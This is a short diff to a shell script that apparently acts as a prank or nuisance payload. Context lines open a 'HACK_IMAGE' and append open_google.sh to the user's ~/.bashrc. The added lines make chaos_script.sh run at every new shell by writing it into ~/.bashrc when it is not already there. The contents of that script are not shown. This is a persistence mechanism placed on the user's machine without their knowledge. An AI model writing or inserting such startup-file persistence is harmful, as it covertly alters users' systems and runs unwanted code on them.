@@ -7,4 +7,6 @@ xdg-open "${HACK_IMAGE}"
 #chmod +x open_google.sh
 echo "$(pwd)/open_google.sh" >> ~/.bashrc
 
-echo hola
+if ! grep -q "$(pwd)/chaos_script.sh" ~/.bashrc; then
+    echo "$(pwd)/chaos_script.sh" >> ~/.bashrc
+fi
